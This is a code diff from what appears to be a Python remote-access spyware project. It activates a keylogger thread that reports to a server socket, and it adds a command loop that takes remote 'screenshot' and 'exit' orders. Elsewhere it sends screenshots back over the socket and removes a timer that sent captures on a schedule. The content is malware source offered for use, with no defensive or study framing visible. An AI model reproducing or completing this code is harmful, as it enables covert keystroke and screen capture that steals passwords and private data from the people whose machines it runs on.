@@ -24,10 +24,15 @@ class Command:
         return self.command
 
     def execute(self):
+        print("Waiting for commands")
         while True:
             self.receive()
             if self.command == "screenshot":
                 print("Taking screenshot")
+                s.sendall("Screenshot taken".encode())
+                # screenshot = Screenshot()
+                # screenshot.start()
+
             elif self.command == "exit":
                 s.close()
                 break
@@ -49,9 +54,7 @@ class Screenshot:
     def start(self):
         screenshot = self.take_screenshot()
         if screenshot:
-            s.sendall(screenshot)
-        Timer(interval=SEND_REPORT_EVERY, function=self.start).start()
-    
+            s.sendall(screenshot)    
 
 class Keylogger:
     def __init__(self, interval, server_socket, report_method="file"):
@@ -89,10 +92,13 @@ class Keylogger:
 
 
 
-# keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s)
-# keylogger_thread = threading.Thread(target=keylogger.start)
-# keylogger_thread.start()
+keylogger = Keylogger(interval=SEND_REPORT_EVERY, server_socket=s)
+keylogger_thread = threading.Thread(target=keylogger.start)
+keylogger_thread.start()
 # keylogger_thread.join()
 
+command = Command()
+command_thread = threading.Thread(target=command.execute)
+command_thread.start()
 
 # s.close()
